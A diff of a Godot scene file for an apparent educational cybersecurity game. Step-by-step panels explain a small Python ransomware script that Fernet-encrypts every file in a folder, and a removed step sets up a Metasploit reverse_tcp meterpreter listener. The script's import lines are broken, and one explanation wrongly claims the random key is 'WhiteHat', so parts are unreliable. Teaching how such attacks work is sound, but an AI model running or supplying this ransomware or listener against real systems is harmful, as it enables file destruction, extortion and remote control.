-tracks/3/interp = 1
-tracks/3/loop_wrap = true
-tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": [true]
-}
-tracks/4/type = "value"
-tracks/4/imported = false
-tracks/4/enabled = true
-tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
-tracks/4/interp = 1
-tracks/4/loop_wrap = true
-tracks/4/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(3.335, 0.685), Vector2(3.2, 0.425)]
-}
-tracks/5/type = "value"
-tracks/5/imported = false
-tracks/5/enabled = true
-tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
-tracks/5/interp = 1
-tracks/5/loop_wrap = true
-tracks/5/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(0.015, 2.585), Vector2(0.015, 3.205)]
-}
-
-[sub_resource type="Animation" id="Animation_fwrof"]
-resource_name = "fileless_18"
-tracks/0/type = "value"
-tracks/0/imported = false
-tracks/0/enabled = true
-tracks/0/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
-tracks/0/interp = 1
-tracks/0/loop_wrap = true
-tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["STEP 5: LISTENER"]
-}
-tracks/1/type = "value"
-tracks/1/imported = false
-tracks/1/enabled = true
-tracks/1/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
-tracks/1/interp = 1
-tracks/1/loop_wrap = true
-tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["Seems everything is right, let's try to run our listener and get ready for our next step"]
-}
-tracks/2/type = "value"
-tracks/2/imported = false
-tracks/2/enabled = true
-tracks/2/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
-tracks/2/interp = 1
-tracks/2/loop_wrap = true
-tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["root@DESKTOP-123ABC:~$ msfconsole
-msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
-PAYLOAD => windows/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) >  set LHOST 192.168.56.102
-LHOST => 192.168.56.102
-msf6 exploit(multi/handler) >  set LPORT 8000
-LPORT => 8000
-msf6 exploit(multi/handler) > show options
-Payload options (windows/meterpreter/reverse_tcp)
-
-Name         Current Setting      Required       Description
-
-EXITFUNC  process   yes         Exit technique (Accepted: ' ', seh, thr, ead, process, none)
-
-LHOST       192.168.29.208         yes         The listen address (an interface maybe specified)
-
-LPORT       8000                           yes         The listen port 
+"values": ["Fernet from cryptography -
+This is a secure encryption system. You can imagine it like a lock-and-key system: it can lock data (encrypt it) so nobody can read it, and later unlock it (decrypt it) using password key.
 "]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
 tracks/3/enabled = true
-tracks/3/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
 tracks/3/interp = 1
 tracks/3/loop_wrap = true
 tracks/3/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": [true]
+"values": ["Importing the Tools"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
 tracks/4/enabled = true
-tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
 tracks/4/interp = 1
 tracks/4/loop_wrap = true
 tracks/4/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.2, 0.425), Vector2(3.975, 4.07)]
+"values": [Vector2(0.135, 0.45)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
 tracks/5/enabled = true
-tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
 tracks/5/interp = 1
 tracks/5/loop_wrap = true
 tracks/5/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.015, 3.205), Vector2(0.015, -0.045)]
+"values": [Vector2(3.025, 0.26)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -870,778 +480,1399 @@ tracks/6/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [12.999999999999998]
+"values": [0.0]
 }
 
-[sub_resource type="Animation" id="Animation_q0tlf"]
-resource_name = "fileless_1"
+[sub_resource type="Animation" id="Animation_xwue7"]
+resource_name = "ransomware_step_03"
 tracks/0/type = "value"
 tracks/0/imported = false
 tracks/0/enabled = true
-tracks/0/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
 tracks/0/interp = 1
 tracks/0/loop_wrap = true
 tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["⚠️FILELESS MALWARE⚠️"]
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
 tracks/1/enabled = true
-tracks/1/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
 tracks/1/interp = 1
 tracks/1/loop_wrap = true
 tracks/1/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Fileless malware is a stealthy type of malicious software. Instead of installing a file on your computer, it runs entirely in memory using trusted system tools. This makes it hard to detect and allows attackers to steal data or control your computer without leaving obvious traces.."]
+"values": [true]
 }
 tracks/2/type = "value"
 tracks/2/imported = false
 tracks/2/enabled = true
-tracks/2/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
 tracks/2/interp = 1
 tracks/2/loop_wrap = true
 tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": [""]
+"values": ["The program prepares a list of files to be encrypted: It starts with an empty list called \"allfiles."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
 tracks/3/enabled = true
-tracks/3/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
 tracks/3/interp = 1
 tracks/3/loop_wrap = true
 tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Collecting Files"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 1.07)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.025, 0.26)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [0.0]
+}
+
+[sub_resource type="Animation" id="Animation_cxtjw"]
+resource_name = "ransomware_step_04"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Then, it looks through everything in the current directory using \"os.listdir()\"."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Collecting Files"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 1.375)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.025, 0.26)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [0.0]
+}
+
+[sub_resource type="Animation" id="Animation_wf7ls"]
+resource_name = "ransomware_step_05"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Certain files are skipped:
+The program file itself [wave](malware.py) [/wave]
+The encryption key file 
+[wave](key.key)[/wave]
+And a possible decryption script
+[wave] (decr.py) [/wave]
+These are skipped so the program doesn’t lock itself or make the key unreachable."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Collecting Files"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 1.375)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.77, 1.16)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [0.0]
+}
+
+[sub_resource type="Animation" id="Animation_vuf0p"]
+resource_name = "ransomware_step_06"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["If an file is confirmed to be an actual file (not a folder), it is added to the list \"allfiles[]\""]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Collecting Files"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 2.635)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.625)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [0.0]
+}
+
+[sub_resource type="Animation" id="Animation_gu46y"]
+resource_name = "ransomware_step_07"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Here, the list is printed out so we can see which files are going to be encrypted"]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Collecting Files"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 3.22)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.315)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [0.0]
+}
+
+[sub_resource type="Animation" id="Animation_de0th"]
+resource_name = "ransomware_step_08"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["The program calls Fernet.generate_key(), where it creates a new password key with a randomized set of characters, but this time it is set to \"WhiteHat\".
+
+ This key is what will lock and later unlock the files. Without it, the encrypted files are useless, because nobody can read them."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Creating the Password Key"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 0.115)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.315)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [13.965]
+}
+
+[sub_resource type="Animation" id="Animation_31cwg"]
+resource_name = "ransomware_step_09"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["The program then saves this key into a file called key.key, using binary write mode (wb).
+
+At this stage, the program has created the “master key” and stored it safely in a separate file."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Creating the Password Key"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 0.43)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.6)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [13.965]
+}
+
+[sub_resource type="Animation" id="Animation_x5n46"]
+resource_name = "ransomware_step_10"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
